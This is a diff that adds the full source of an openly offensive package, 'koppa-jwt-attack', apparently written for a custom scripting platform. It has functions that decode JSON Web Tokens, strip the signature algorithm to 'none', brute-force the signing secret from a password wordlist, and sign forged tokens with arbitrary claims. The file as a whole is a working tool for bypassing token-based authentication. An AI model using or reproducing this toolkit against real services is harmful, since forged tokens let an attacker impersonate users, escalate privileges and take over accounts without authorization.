@@ -1,0 +1,61 @@
+## koppa package: koppa-jwt-attack
+## version: 2.0.0
+## description: JWT token attack toolkit — decode, forge, alg-none, brute-force secret
+## author: KOPPA-OS
+## tags: web, auth, jwt, crypto
+
+import crypt, log, sys, net
+
+fn decode(token) {
+    let parts = token.split(".")
+    let header  = crypt.b64_decode(parts[0])
+    let payload = crypt.b64_decode(parts[1])
+    log.info("[*] Header:  " + header)
+    log.info("[*] Payload: " + payload)
+    return { header: header, payload: payload }
+}
+
+fn alg_none(token) {
+    let parts   = token.split(".")
+    let header  = crypt.b64_decode(parts[0]).replace('"alg":"HS256"', '"alg":"none"')
+    let new_tok = crypt.b64_encode(header) + "." + parts[1] + "."
+    log.ok("[+] alg:none token: " + new_tok)
+    return new_tok
+}
+
+fn brute_secret(token, wordlist) {
+    log.info("[*] Brute-forcing JWT secret...")
+    let words = sys.read_lines(wordlist)
+    for word in words {
+        if crypt.jwt_verify(token, word) {
+            log.ok("[+] Secret found: " + word)
+            return word
+        }
+    }
+    log.err("[-] Secret not found")
+    return ""
+}
+
+fn forge(payload_json, secret, alg) {
+    let tok = crypt.jwt_sign(payload_json, secret, alg or "HS256")
+    log.ok("[+] Forged token: " + tok)
+    return tok
+}
+
+fn main(args) {
+    log.info("[koppa-jwt-attack] JWT Attack v2.0")
+    let token = args[0] or sys.prompt("JWT token: ")
+    let mode  = args[1] or "decode"
+
+    if mode == "decode"    { decode(token) }
+    if mode == "alg-none"  { alg_none(token) }
+    if mode == "brute" {
+        let wl = args[2] or "/usr/share/wordlists/rockyou.txt"
+        brute_secret(token, wl)
+    }
+    if mode == "forge" {
+        let payload = args[2] or sys.prompt("Payload JSON: ")
+        let secret  = args[3] or sys.prompt("Secret: ")
+        forge(payload, secret, args[4])
+    }
+}
